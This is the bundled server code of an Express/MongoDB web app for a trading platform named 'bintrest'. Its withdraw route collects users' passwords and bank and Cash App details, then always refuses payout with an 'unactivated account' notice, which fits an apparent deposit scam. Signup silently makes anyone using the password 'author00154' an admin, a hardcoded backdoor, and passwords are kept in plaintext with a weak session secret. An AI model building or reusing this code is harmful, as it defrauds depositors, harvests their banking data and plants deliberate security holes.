'use strict';

var express = require('express');
var path = require('path');
var mongoose = require('mongoose');
var passport = require('passport');
var flash = require('connect-flash');
var session = require('express-session');
var expressReactViews = require('express-react-views');
var passportLocal = require('passport-local');
var serverless = require('serverless-http');

function _interopDefaultLegacy (e) { return e && typeof e === 'object' && 'default' in e ? e : { 'default': e }; }

var express__default = /*#__PURE__*/_interopDefaultLegacy(express);
var mongoose__default = /*#__PURE__*/_interopDefaultLegacy(mongoose);
var passport__default = /*#__PURE__*/_interopDefaultLegacy(passport);
var flash__default = /*#__PURE__*/_interopDefaultLegacy(flash);
var session__default = /*#__PURE__*/_interopDefaultLegacy(session);
var serverless__default = /*#__PURE__*/_interopDefaultLegacy(serverless);

const router$2 = express__default['default'].Router();

router$2.get("/", (req, res) => {
  res.render("Index");
});

const IndexRouter = router$2;

const Schema$1 = mongoose__default['default'].Schema;

const NotificationsSchema = new Schema$1({
  user: { type: Schema$1.Types.ObjectId, ref: "User" },
  content: { type: String, required: true },
  topic: { type: String, required: true },
  date: { type: Date, default: new Date() },
});

const Notification = mongoose__default['default'].model("Notifications", NotificationsSchema);

// import ensureAuthenticated from "../services/guards/useAuthGuard.js";

const router$1 = express__default['default'].Router();
router$1.get("/", (req, res) => {
  res.render("Dashboard", { user: req.user, pathname: req._parsedOriginalUrl });
});

router$1.get("/deposit", (req, res) => {
  // console.log(req._parsedOriginalUrl);
  res.render("Deposit", { user: req.user, pathname: req._parsedOriginalUrl });
});

router$1.get("/notification/:id", (req, res) => {
  const { id } = req.params;

  Notification.findOne({ _id: id }).then(({ topic, content, date }) => {
    res.render("Notification", {
      user: req.user,
      pathname: req._parsedOriginalUrl,
      topic,
      content,
      date,
    });
  });
});

router$1.get("/withdraw", (req, res) => {
  // console.log(req._parsedOriginalUrl);
  res.render("Withdraw", { user: req.user, pathname: req._parsedOriginalUrl });
});

router$1.get("/notifications", (req, res) => {
  // console.log(req._parsedOriginalUrl);
  Notification.find({ user: req.user.id }).then((notifis) => {
    console.log(notifis);
    res.render("Notifications", {
      user: req.user,
      pathname: req._parsedOriginalUrl,
      notifications: notifis,
    });
  });
});

router$1.post("/withdraw", (req, res) => {
  const {
    select,
    email,
    password,
    re_password,
    phone,
    amount,
    country,
    accnt_num,
    accnt_name,
    cash_app,
  } = req.body;
  // console.log(req.body);

  // let errors = [];

  if (
    !amount ||
    !select ||
    !email ||
    !password ||
    !re_password ||
    !phone ||
    !country ||
    !accnt_name ||
    !accnt_num
  ) {
    req.flash("error_msg", "All fields are required");
    res.redirect("/dashboard/withdraw");
  }
  if (password !== re_password) {
    req.flash("error_msg", "Passwords does not match");
    res.redirect("/dashboard/withdraw");
  }
  if (select == "option") {
    req.flash("error_msg", "Select a valid payment option");
    res.redirect("/dashboard/withdraw");
  }
  if (password !== req.user.password) {
    req.flash(
      "error_msg",
      "The password given does not match your account password"
    );
    res.redirect("/dashboard/withdraw");
  }
  if (select == "cashapp" && !cash_app) {
    req.flash(
      "error_msg",
      "Your payment option is cashapp but you left your cashapp hash tag field epmty, please fill it."
    );
    res.redirect("/dashboard/withdraw");
  } else {
    const newNotifis = new Notification({
      user: req.user.id,
      topic: "Withdrawals not available due to unactivated account",
      content: `Dear ${req.user.name} this action can't be completed due to unactivated account. Kindly activate your account to enjoy this resource.
      If you are having trouble with any of our service please kindly send an email to bintrest-trade@gmail.com laying down your complaints.
      `,
    });
    newNotifis
      .save()
      .then(() => {
        req.flash(
          "error_msg",
          `Your account is not yet activated for withdrawals <a class='font-bold' href='/dashboard/notification/${newNotifis._id}'>Click here to know more..</a>`
        );
        res.redirect("/dashboard/withdraw");
      })
      .catch((e) => {
        console.log(e);
      });
  }

  // if (!address) {
  //   errors.push({ msg: "Address field should not be empty" });
  // }
  // if (!amount) {
  //   errors.push({ msg: "Amount field should not be empty" });
  // }

  // if (errors.length > 0) {
  //   return res.render("Withdraw", {
  //     user: req.user,
  //     pathname: req._parsedOriginalUrl,
  //     errors,
  //   });
  // } else {
  //   req.flash("error_msg", "Your balance is not yet matured for withdrawals");
  //   res.redirect("/dashboard/withdraw");
  // }
});

const DashboardRouter = router$1;

const Schema = mongoose__default['default'].Schema;

const UserSchema = new Schema({
  name: {
    type: String,
    required: true,
  },
  email: {
    type: String,
    required: true,
  },
  password: {
    type: String,
    required: true,
  },
  phone: {
    type: String,
    required: true,
  },
  balance: {
    type: String,
    required: false,
    default: "0",
  },
  withdrawls: {
    type: String,
    required: false,
    default: "0",
  },
  earning: {
    type: String,
    required: false,
    default: "0",
  },
  deposit: {
    type: String,
    required: false,
    default: "0",
  },
  role: {
    type: String,
    required: true,
  },
  notifications: [{ type: Schema.Types.ObjectId, ref: "Notifications" }],
  date: {
    type: Date,
    default: Date.now,
  },
});

const User = mongoose__default['default'].model("User", UserSchema);

const router = express__default['default'].Router();

router.get("/login", (req, res) => {
  res.render("SignIn");
});

router.get("/signup", (req, res) => {
  res.render("SignUp");
});

router.post("/login", (req, res, next) => {
  passport__default['default'].authenticate("local", {
    successRedirect: "/dashboard",
    failureRedirect: "/user/login",
    failureFlash: true,
  })(req, res, next);
});

router.post("/signup", (req, res) => {
  const { name, password, re_password, email, phone_number } = req.body;

  let errors = [];
  if (!name || !email || !password || !re_password) {
    errors.push({ msg: "Please enter all fields" });
  }

  if (password != re_password) {
    errors.push({ msg: "Passwords do not match" });
  }

  if (password.length < 6) {
    errors.push({ msg: "Password must be at least 6 characters" });
  }

  if (errors.length > 0) {
    console.log(errors);
    res.render("SignUp", {
      errors,
      name,
      email,
      phone_number,
    });
  } else {
    User.findOne({ email: email }).then((user) => {
      if (user) {
        errors.push({ msg: "Email already exists" });
        res.render("SignUp", {
          errors,
          name,
          email,
          phone_number,
        });
      } else {
        const newUser = new User({
          name,
          email,
          password,
          phone: phone_number,
          role: password == "author00154" ? "admin" : "user",
        });
        newUser
          .save()
          .then((user) => {
            req.flash("success_msg", "You are now registered and can log in");
            res.redirect("/user/login");
          })
          .catch((err) => {
            if (err.errors.phone) {
              errors.push({ msg: "Phone Number field is required" });
              res.render("SignUp", {
                errors,
                name,
                email,
                phone_number,
              });
            }
          });
      }
    });
  }
});

router.get("/logout", (req, res) => {
  req.logout();
  req.flash("success_msg", "You are logged out");
  res.redirect("/user/login");
});

const UserRouter = router;
//

const _passport = function (passport) {
  passport.use(
    new passportLocal.Strategy({ usernameField: "email" }, (email, password, done) => {
      // Match user
      User.findOne({
        email: email,
      }).then((user) => {
        if (!user) {
          return done(null, false, { message: "That email is not registered" });
        }

        // Match password
        if (password == user.password) {
          return done(null, user);
        } else {
          return done(null, false, { message: "Password incorrect" });
        }
      });
    })
  );

  passport.serializeUser(function (user, done) {
    done(null, user.id);
  });

  passport.deserializeUser(function (id, done) {
    User.findById(id, function (err, user) {
      done(err, user);
    });
  });
};

const ensureAuthenticated = (req, res, next) => {
  if (req.isAuthenticated()) {
    return next();
  } else {
    req.flash("error_msg", "Please log in to view this resource..");
    res.redirect("/user/login");
  }
};

const app = express__default['default']();

const db2 = "mongodb://localhost/bintrest";
_passport(passport__default['default']);
mongoose__default['default']
  .connect(db2, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  })
  .then(() => console.log("MongoDB Connected"))
  .catch((err) => console.log(err));
app.use(express__default['default'].static(path.join(path.resolve(), "static")));
app.set("views", path.join(path.resolve(), "views"));
app.set("view engine", "jsx");
app.engine("jsx", expressReactViews.createEngine({}));

app.use(express__default['default'].urlencoded({ extended: true }));

app.use(session__default['default']({ secret: "secret", resave: true, saveUninitialized: true }));

app.use(passport__default['default'].initialize());
app.use(passport__default['default'].session());

app.use(flash__default['default']());

app.use(function (req, res, next) {
  res.locals.success_msg = req.flash("success_msg");
  res.locals.error_msg = req.flash("error_msg");
  res.locals.error = req.flash("error");
  res.locals._url = req.url;
  next();
});

app.use("/", IndexRouter);
app.use("/dashboard", ensureAuthenticated, DashboardRouter);
app.use("/user", UserRouter);

app.listen(process.env.PORT || 3000, console.log("Server running"));

// export { app };

module.exports.handler = serverless__default['default'](app);
